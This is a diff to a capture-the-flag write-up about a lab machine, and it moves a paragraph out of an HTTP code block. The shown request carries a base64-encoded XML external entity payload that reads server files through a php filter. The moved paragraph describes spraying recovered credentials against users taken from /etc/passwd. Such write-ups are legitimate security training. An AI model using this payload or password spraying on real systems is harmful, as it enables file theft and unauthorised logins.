@@ -319,13 +319,6 @@ Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 X-Requested-With: XMLHttpRequest
 Content-Length: 375
-```
-Again we need to decode the base64 data we received.
-It seems that we got some credentials and now it is possible to check if we can login. We are spraying this
-password to system users we got from the /etc/passwd file and indeed we manage to get a successful
-login with the user development .
-
-```http
 Origin: http://10.129.198.241
 DNT: 1
 Connection: close
@@ -337,6 +330,10 @@ o8IUVOVElUWSBmaWxlIFNZU1RFTSAicGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2
 IDxjd2U%2bdGVzdDwvY3dlPgogIDxjdnNzPnRlc3Q8L2N2c3M%2bCiAgPHJld2FyZD4mZmlsZTs8L3Jld2FyZD4
 KPC9idWdyZXBvcnQ%2bCg%3d%3d
 ```
+Again we need to decode the base64 data we received.
+It seems that we got some credentials and now it is possible to check if we can login. We are spraying this
+password to system users we got from the /etc/passwd file and indeed we manage to get a successful
+login with the user development .
 
 ```
 This is our response
